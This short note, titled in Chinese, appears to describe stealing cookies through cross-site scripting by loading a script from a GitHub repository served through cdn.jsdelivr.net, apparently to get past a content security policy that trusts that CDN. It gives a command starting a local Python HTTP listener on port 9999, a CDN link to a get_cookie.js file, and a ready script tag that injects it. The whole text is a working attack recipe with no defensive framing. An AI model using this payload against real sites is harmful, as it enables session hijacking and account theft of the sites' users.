利用cdn.jsdelivr.net托管仓库造成XSS泄露cookie
python3 -m http.server 9999
https://cdn.jsdelivr.net/gh/wedidaprettygoodjobsofar/csp_bypass@1055fb0f4da637522aa54472e0c288060651b513/get_cookie.js
<script src="https://cdn.jsdelivr.net/gh/wedidaprettygoodjobsofar/xss_script@1055fb0f4da637522aa54472e0c288060651b513/get_cookie.js"></script>
